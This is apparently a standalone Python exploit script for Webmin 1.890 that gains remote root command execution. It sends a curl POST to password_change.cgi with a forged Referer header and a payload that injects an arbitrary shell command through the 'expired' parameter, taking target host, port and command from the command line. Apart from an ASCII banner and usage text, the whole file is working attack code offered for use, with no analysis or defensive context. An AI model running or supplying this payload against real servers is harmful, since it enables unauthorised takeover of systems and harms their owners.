#!/usr/bin/env python3
import os
import sys


STAIN = """

--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root
"""
usage = """Usage: python3 exploit.py HOST PORT COMMAND

Ex: python3 exploit.py 10.0.0.1 10000 id
                                                                                                                                   
"""

def exploit(target, port, url, command):
    header = 'Referer: https://{}:{}/session_login.cgi'.format(target,port)
    payload = 'user=gotroot&pam=&expired=2|echo "";{}'.format(command)
    os.system("curl -k {} -d '{}' -H '{}'".format(url,payload,header))


if __name__ == '__main__':
    try:
        print(STAIN)
        target = sys.argv[1]
        port = sys.argv[2]
        url = "https://"+target+":"+port+"/password_change.cgi"
        command = sys.argv[3]
        exploit(target, port, url, command)
    except:
        print(STAIN)
        print(usage)
